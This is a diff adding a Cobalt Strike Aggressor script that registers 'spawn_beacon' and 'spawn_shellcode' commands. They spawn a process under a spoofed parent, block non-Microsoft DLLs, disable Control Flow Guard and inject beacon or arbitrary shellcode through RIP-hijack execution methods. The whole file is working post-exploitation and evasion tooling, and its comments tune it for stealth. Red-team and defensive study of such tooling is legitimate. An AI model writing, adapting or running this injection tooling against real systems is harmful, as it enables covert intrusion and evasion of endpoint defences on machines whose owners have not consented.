@@ -1,0 +1,314 @@
+# ================================================================
+# BOF_spawn.cna - Cobalt Strike Aggressor Script
+# ================================================================
+
+beacon_command_register(
+    "spawn_beacon",
+    "Spawn beacon with a custom BOF",
+    "Synopsis: spawn_beacon <LISTENER>\n" .
+    "\nDescription:\n" .
+    "  Spawns a new beacon using advanced process creation techniques.\n" .
+    "  Configure spawn options via: Additionals postex -> Spawn beacon\n\n" .
+    "Arguments:\n" .
+    "  <LISTENER>  Name of the Cobalt Strike listener to use\n\n" .
+    "Examples:\n" .
+    "  spawn_beacon http-listener\n" .
+    "  spawn_beacon smb-listener"
+);
+
+beacon_command_register(
+    "spawn_shellcode",
+    "Spawn custom shellcode in a new process",
+    "Synopsis: spawn_shellcode <shellcode_file>\n" .
+    "\nDescription:\n" .
+    "  Spawns a new process and injects custom shellcode.\n" .
+    "  Configure spawn options via: Additionals postex -> Spawn beacon\n\n" .
+    "Arguments:\n" .
+    "  <shellcode_file>  Path to raw shellcode binary file\n\n" .
+    "Examples:\n" .
+    "  spawn_shellcode /tmp/payload.bin"
+);
+
+# ================================================================
+# DEFAULT CONFIGURATION
+# ================================================================
+$process_spawn = "\\??\\C:\\Windows\\System32\\rundll32.exe";
+$parent_process = "explorer.exe";
+$working_dir = "C:\\Windows\\System32";
+$cmd_line = "C:\\Windows\\System32\\rundll32.exe";
+$block_dll = "true";
+$cfg_disable = "true";
+$use_rwx = "false";  # Changed default to false for better OpSec
+$exec = "Hijack RIP Callback";
+
+# ================================================================
+# APPLY CONFIGURATION CALLBACK
+# ================================================================
+sub ApplyConfig {
+    println("\n" . "[" . tstamp(ticks()) . "] Configuration Update");
+    println("=" x 60);
+
+    $process_spawn = $3['process_spawn'];
+    $parent_process = $3['ppid_spoof'];
+    $working_dir = $3['working_dir'];
+    $cmd_line = $3['cmd_line'];
+    $block_dll = $3['blockdll_box'];
+    $cfg_disable = $3['cfg_box'];
+    $use_rwx = $3['use_rwx'];
+    $exec = $3['execmem'];
+
+    println("Process name:        $process_spawn");
+    println("Parent Process:      $parent_process");
+    println("Working directory:   $working_dir");
+    println("Command line:        $cmd_line");
+    println("Block DLL policy:    $block_dll");
+    println("Disable CFG:         $cfg_disable");
+    println("Use RWX:             $use_rwx");
+    println("Execution method:    $exec");
+    println("=" x 60);
+    println("[+] Configuration applied successfully\n");
+}
+
+# ================================================================
+# BOF PACKING SPECIFICATION
+# ================================================================
+# Format: PROCESS_SPAWN | PARENT_PROCESS | WORKING_DIR | CMD_LINE | 
+#         BLOCK_DLL | DISABLE_CFG | USE_RWX | EXEC_METHOD | SHELLCODE
+# Types:  Z (wstring) | Z | Z | Z | i (int) | i | i | i | b (binary)
+# ================================================================
+
+# ================================================================
+# CONFIGURATION DIALOG
+# ================================================================
+sub ProcessConfig {
+    $dialog = dialog("Spawn Process Configuration", 
+        %(process_spawn => $process_spawn, 
+        working_dir => $working_dir, 
+        cmd_line => $cmd_line, 
+        ppid_spoof => $parent_process, 
+        blockdll_box => $block_dll, 
+        cfg_box => $cfg_disable, 
+        use_rwx => $use_rwx, 
+        execmem => $exec), 
+        &ApplyConfig);
+
+    dialog_description($dialog, 
+        "Configure process spawning and injection parameters:\n\n" .
+        "Process Name:        Executable path to spawn (e.g., rundll32.exe)\n" .
+        "Working Directory:   Current directory for spawned process\n" .
+        "PPID Process:        Parent process name for PPID spoofing (empty = disabled)\n" .
+        "CMD Line:            Command line arguments for spawned process\n" .
+        "Block DLL Policy:    Restrict to Microsoft-signed DLLs only\n" .
+        "Disable CFG:         Disable Control Flow Guard (required for callback method)\n" .
+        "Use RWX:             Allocate memory as RWX (less stealthy but simpler)\n" .
+        "Execute Method:      Technique for shellcode execution"
+    );
+    
+    drow_text($dialog, "process_spawn", "Process Name:");
+    drow_text($dialog, "working_dir", "Working Directory:");
+    drow_text($dialog, "ppid_spoof", "PPID Spoof Process:");
+    drow_text($dialog, "cmd_line", "Command Line:");
+    drow_checkbox($dialog, "blockdll_box", "Block Non-Microsoft DLLs");
+    drow_checkbox($dialog, "cfg_box", "Disable CFG");
+    drow_checkbox($dialog, "use_rwx", "Use RWX Memory");
+    drow_combobox($dialog, "execmem", "Execution Method:", 
+        @("Hijack RIP Direct", "Hijack RIP Jmp Rax", "Hijack RIP Jmp Rbx", "Hijack RIP Callback"));
+
+    dbutton_action($dialog, "Apply Configuration");
+    dialog_show($dialog);
+}
+
+# ================================================================
+# HELPER: CONVERT BOOLEAN TO INTEGER
+# ================================================================
+sub bool_to_int {
+    if ($1 eq "false") {
+        return 0;
+    }
+    return 1;
+}
+
+# ================================================================
+# HELPER: GET BOF PATH
+# ================================================================
+sub get_bof_path {
+    # Try current directory first
+    $bof_path = script_resource("Bin/bof.o");
+    if (-exists $bof_path) {
+        return $bof_path;
+    }
+    
+    # Try parent directory
+    $bof_path = script_resource("../Bin/bof.o");
+    if (-exists $bof_path) {
+        return $bof_path;
+    }
+    
+    # Return relative path and let it fail with descriptive error
+    return "Bin/bof.o";
+}
+
+# ================================================================
+# ALIAS: spawn_beacon
+# ================================================================
+alias spawn_beacon {
+    if ($2 is $null) {
+        berror($1, "Missing required argument: <LISTENER>");
+        berror($1, "Usage: spawn_beacon <LISTENER>");
+        return;
+    }
+
+    println("\n" . "[" . tstamp(ticks()) . "] Spawn Beacon Request");
+    println("=" x 60);
+
+    $barch = barch($1);
+
+    # Validate architecture
+    if ($barch !eq 'x64') {
+        berror($1, "This BOF only supports x64 architecture");
+        return;
+    }
+
+    # Validate listener exists
+    if (($2 !in listeners()) && ($2 !in listeners_local()) && ($2 !in listeners_stageless())) {
+        berror($1, "Listener " . $2 . " does not exist");
+        return;
+    }
+
+    # Convert boolean strings to integers
+    $temp_block_dll = bool_to_int($block_dll);
+    $temp_cfg_disable = bool_to_int($cfg_disable);
+    $temp_use_rwx = bool_to_int($use_rwx);
+
+    # Map execution method string to integer
+    $temp_exec = 0;
+    if ($exec iswm "Hijack RIP Direct") {
+        $temp_exec = 0;
+    } else if ($exec iswm "Hijack RIP Jmp Rax") {
+        $temp_exec = 1;
+    } else if ($exec iswm "Hijack RIP Jmp Rbx") {
+        $temp_exec = 2;
+    } else if ($exec iswm "Hijack RIP Callback") {
+        $temp_exec = 3;
+    }
+
+    println("Block DLL:        $temp_block_dll");
+    println("Disable CFG:      $temp_cfg_disable");
+    println("Use RWX:          $temp_use_rwx");
+    println("Execution:        $temp_exec");
+
+    # Load BOF
+    $bof_path = get_bof_path();
+    if (!-exists $bof_path) {
+        berror($1, "BOF file not found at: $bof_path");
+        berror($1, "Please ensure Bin/bof.o exists in the script directory");
+        return;
+    }
+
+    $handle = openf($bof_path);
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Generate beacon payload
+    $shellcode = payload($2, "x64", "process");
+    println("Shellcode size:   " . strlen($shellcode) . " bytes");
+    println("=" x 60 . "\n");
+
+    # Pack arguments and execute
+    $args = bof_pack($1, "ZZZZiiiib", 
+        $process_spawn, $parent_process, $working_dir, $cmd_line, 
+        $temp_block_dll, $temp_cfg_disable, $temp_use_rwx, $temp_exec, 
+        $shellcode);
+    
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+# ================================================================
+# ALIAS: spawn_shellcode
+# ================================================================
+alias spawn_shellcode {
+    if ($2 is $null) {
+        berror($1, "Missing required argument: <shellcode_file>");
+        berror($1, "Usage: spawn_shellcode <shellcode_file>");
+        return;
+    }
+
+    println("\n" . "[" . tstamp(ticks()) . "] Spawn Shellcode Request");
+    println("=" x 60);
+
+    $barch = barch($1);
+
+    # Validate architecture
+    if ($barch !eq 'x64') {
+        berror($1, "This BOF only supports x64 architecture");
+        return;
+    }
+
+    # Validate shellcode file exists
+    if (!-exists $2) {
+        berror($1, "Shellcode file not found: $2");
+        return;
+    }
+
+    # Convert boolean strings to integers
+    $temp_block_dll = bool_to_int($block_dll);
+    $temp_cfg_disable = bool_to_int($cfg_disable);
+    $temp_use_rwx = bool_to_int($use_rwx);
+
+    # Map execution method string to integer
+    $temp_exec = 0;
+    if ($exec iswm "Hijack RIP Direct") {
+        $temp_exec = 0;
+    } else if ($exec iswm "Hijack RIP Jmp Rax") {
+        $temp_exec = 1;
+    } else if ($exec iswm "Hijack RIP Jmp Rbx") {
+        $temp_exec = 2;
+    } else if ($exec iswm "Hijack RIP Callback") {
+        $temp_exec = 3;
+    }
+
+    println("Block DLL:        $temp_block_dll");
+    println("Disable CFG:      $temp_cfg_disable");
+    println("Use RWX:          $temp_use_rwx");
+    println("Execution:        $temp_exec");
+
+    # Load BOF
+    $bof_path = get_bof_path();
+    if (!-exists $bof_path) {
+        berror($1, "BOF file not found at: $bof_path");
+        berror($1, "Please ensure Bin/bof.o exists in the script directory");
+        return;
+    }
+
+    $handle = openf($bof_path);
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Load shellcode
+    $sc_handle = openf($2);
+    $shellcode = readb($sc_handle, -1);
+    closef($sc_handle);
+    
+    println("Shellcode file:   $2");
+    println("Shellcode size:   " . strlen($shellcode) . " bytes");
+    println("=" x 60 . "\n");
+
+    # Pack arguments and execute
+    $args = bof_pack($1, "ZZZZiiiib", 
+        $process_spawn, $parent_process, $working_dir, $cmd_line, 
+        $temp_block_dll, $temp_cfg_disable, $temp_use_rwx, $temp_exec, 
+        $shellcode);
+    
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+# ================================================================
+# UI INTEGRATION
+# ================================================================
+popup custom_additionals {
+    item "Spawn Process Config" {
+        ProcessConfig();
+    }
+}
+
+menubar("Additionals postex", "custom_additionals");
